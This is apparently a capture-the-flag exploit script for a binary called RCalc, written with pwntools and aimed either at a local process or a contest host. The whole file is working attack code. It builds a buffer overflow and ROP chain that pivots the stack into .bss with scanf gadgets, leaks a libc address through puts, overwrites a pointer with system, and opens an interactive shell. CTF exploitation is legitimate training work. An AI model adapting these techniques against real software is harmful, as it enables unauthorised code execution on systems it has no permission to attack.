#!/usr/bin/env python2
from pwn import *
import sys
import time

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(["./RCalc"])
    else:
        s = remote("rcalc.2017.teamrois.cn",2333)

    puts_plt = 0x400820
    puts_got = 0x602020
    puts_offset = 0x6f690
    system_offset = 0x45390
    scanf_plt = 0x4008e0
    pop_rdi = 0x401123
    pop_rsi_r15 = 0x401121
    leave = 0x401034
    bss_addr = 0x6029c0
    ps_str = 0x401203
    
    payload = ""
    payload += "A" * 0x108
    payload += p64(0)
    payload += p64(bss_addr-8)
    payload += p64(pop_rdi) + p64(ps_str)
    payload += p64(pop_rsi_r15) + p64(bss_addr+0x110) + "A" * 8
    payload += p64(scanf_plt)
    for i in range(-8,8*11,8):
        payload += p64(pop_rdi) + p64(bss_addr+0x110)
        payload += p64(pop_rsi_r15) + p64(bss_addr+i) + "A" * 8
        payload += p64(scanf_plt)
    payload += p64(pop_rdi) + p64(ps_str)
    payload += p64(pop_rsi_r15) + p64(bss_addr+0x100) + "A" * 8
    payload += p64(scanf_plt)
    payload += p64(leave)
    s.sendline(payload)

    for i in range((0x603160-0x603050) // 8):
        s.sendline("1")
        s.sendline("1")
        s.sendline("0")
        s.send("yes")
        time.sleep(0.1)
    s.sendline("1")
    s.sendline("0")
    s.sendline("0")
    s.send("yes")
    s.recvuntil("The result is 0")
    s.recvuntil("Your choice:")
    s.sendline("5")

    s.sendline("%ulld")
    s.sendline("0")
    s.sendline(str(pop_rdi))
    s.sendline(str(puts_got))
    s.sendline(str(puts_plt))
    s.sendline(str(pop_rdi))
    s.sendline(str(ps_str))
    s.sendline(str(pop_rsi_r15))
    s.sendline(str(bss_addr+8*11))
    s.sendline("0")
    s.sendline(str(scanf_plt))
    s.sendline(str(pop_rdi))
    s.sendline(str(bss_addr+0x100))
    s.sendline("/bin/sh")

    libc_base = u64(s.recvline(False).ljust(8,'\0')) - puts_offset
    print "[*] libc base is at", hex(libc_base)
    s.sendline(p64(libc_base+system_offset))
    s.interactive()
